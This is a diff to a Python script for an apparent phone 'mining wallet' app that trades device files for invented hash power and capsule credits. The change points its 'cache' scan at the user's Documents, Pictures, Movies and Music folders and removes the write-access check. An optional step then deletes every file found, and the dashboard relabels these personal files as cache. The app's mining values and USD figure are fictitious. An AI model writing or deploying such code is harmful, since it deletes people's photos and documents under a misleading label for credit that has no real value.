@@ -45,7 +45,7 @@ def create_wallet(wallet_id, rig_id=None):
         "rig_id": rig_id or wallet_id,
         "capsule_value_mb": Decimal("0"),
         "cache_value_mb": Decimal("0"),
-        "rig_hash_power": Decimal("10000"),  # baseline
+        "rig_hash_power": Decimal("10000"),
         "real_kwh": Decimal("0"),
         "bandwidth_MBps": Decimal("0"),
     }
@@ -103,34 +103,45 @@ def mint_capsule(wallet, capsule_type, reward_mb, mining_type):
     }
     return metadata
 
+# --- Scan device user-accessible folders ---
 def scan_device_cache_mb(delete_after=False):
-    """Scan and optionally delete cache files for hash power"""
+    """
+    Scan accessible folders for cache/data: Download, Documents, Pictures, Movies, Music
+    """
     total_cache = Decimal("0")
-    paths_to_scan = [
-        os.path.join(BASEDIR, "Download"),
-        os.path.join(BASEDIR, "Android/data"),
-    ]
     all_files = []
-    for path in paths_to_scan:
+
+    user_paths = [
+        os.path.join(BASEDIR, "Download"),
+        os.path.join(BASEDIR, "Documents"),
+        os.path.join(BASEDIR, "Pictures"),
+        os.path.join(BASEDIR, "Movies"),
+        os.path.join(BASEDIR, "Music"),
+    ]
+
+    for path in user_paths:
         if os.path.exists(path):
             for root, dirs, files in os.walk(path):
                 for f in files:
                     file_path = os.path.join(root, f)
-                    if os.access(file_path, os.W_OK):
-                        try:
-                            size_mb = Decimal(os.path.getsize(file_path)) / Decimal(1024*1024)
-                            total_cache += size_mb
-                            all_files.append((file_path, size_mb))
-                        except Exception:
-                            continue
+                    try:
+                        size_mb = Decimal(os.path.getsize(file_path)) / Decimal(1024*1024)
+                        total_cache += size_mb
+                        all_files.append((file_path, size_mb))
+                    except Exception:
+                        continue
+
+    # Optional deletion
     if delete_after:
         for file_path, size_mb in all_files:
             try:
                 os.remove(file_path)
             except Exception:
                 continue
+
     return total_cache, all_files
 
+# --- Unified Mining Loop ---
 def unified_mining_loop(wallet, mining_type):
     capsule_types = [
         "sha","bandwidth","electrism","manierism","handrichism",
@@ -196,7 +207,7 @@ def wallet_transaction_menu(wallet):
                     if not target:
                         target = create_wallet(target_id)
                     target["cache_value_mb"] += amt
-                    wallet["rig_hash_power"] += amt  # hash proportional
+                    wallet["rig_hash_power"] += amt
                     save_wallet(wallet)
                     save_wallet(target)
                     print(f"✅ Sent {amt} Cache MB (+{amt} H/s) to {target_id}")
@@ -209,7 +220,6 @@ def wallet_transaction_menu(wallet):
                 if total_spendable == 0:
                     print("⚠️ No cache MB available to add hash power.")
                     continue
-                # Use all device cache for hash
                 added_hash = Decimal("0")
                 for file_path, size_mb in files:
                     try:
@@ -253,7 +263,7 @@ def show_rig_dashboard(wallet):
     print(f"💾 Capsule MB: {wallet['capsule_value_mb']:.6f}")
     print(f"📦 Cache MB: {wallet['cache_value_mb']:.6f}")
     device_cache, _ = scan_device_cache_mb()
-    print(f"📥 Device Cache (Deep Scan): {device_cache:.6f} MB")
+    print(f"📥 Device Cache (User Folders): {device_cache:.6f} MB")
     print(f"⚡ Real kWh: {wallet['real_kwh']:.6f}")
     print(f"USD Value: ${float(wallet['capsule_value_mb'])*0.05:.2f}")
     print(f"📡 Bandwidth: {wallet['bandwidth_MBps']:.6f} MB/s")
